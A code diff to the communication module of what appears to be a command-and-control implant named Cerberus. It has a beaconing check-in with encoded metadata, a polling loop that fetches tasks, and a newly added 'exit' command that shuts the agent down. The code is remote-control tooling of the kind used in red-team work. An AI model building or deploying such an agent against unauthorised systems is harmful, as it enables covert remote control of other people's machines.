@@ -19,6 +19,7 @@ namespace Cerberus.Models.CommModule
         public string HostHeader { get; set; }
         public int SleepTime { get; set; }
         public string CallbackUUID { get; set; }
+        public bool Exit { get; set; } = false;
         public CerberusMetadata Metadata { get; set; }
 
         private CancellationTokenSource _cancellationTokenSource;
@@ -80,13 +81,14 @@ namespace Cerberus.Models.CommModule
                 {
                     await GetTasking();
                 }
-
                 // Sleep
                 await Task.Delay(SleepTime);
             }
+            
+            Environment.Exit(0);
         }
 
-        private async Task InitCheckin()
+        public override async Task InitCheckin()
         {
             var encodedMetadata = Convert.ToBase64String(Metadata.Serialize());
             var encodedUUID = Convert.ToBase64String(Encoding.UTF8.GetBytes(PayloadUUID));
@@ -141,6 +143,11 @@ namespace Cerberus.Models.CommModule
             var responseContent = await response.Content.ReadAsStringAsync();
 
             HandlePostResponse(responseContent);
+
+            if (Exit)
+            {
+                Stop();
+            }
         }
 
         private void HandleTaskingResponse(string response)
@@ -155,6 +162,11 @@ namespace Cerberus.Models.CommModule
                 foreach (var task in tasks)
                 {
                     Inbound.Enqueue(task);
+
+                    if (task.command.Equals("exit"))
+                    {
+                        Exit = true;
+                    }
                 }
             }
         }
@@ -176,11 +188,6 @@ namespace Cerberus.Models.CommModule
         public override void Stop()
         {
             _cancellationTokenSource.Cancel();
-        }
-
-        public override Task InitialCheckin()
-        {
-            throw new NotImplementedException();
         }
     }
 }
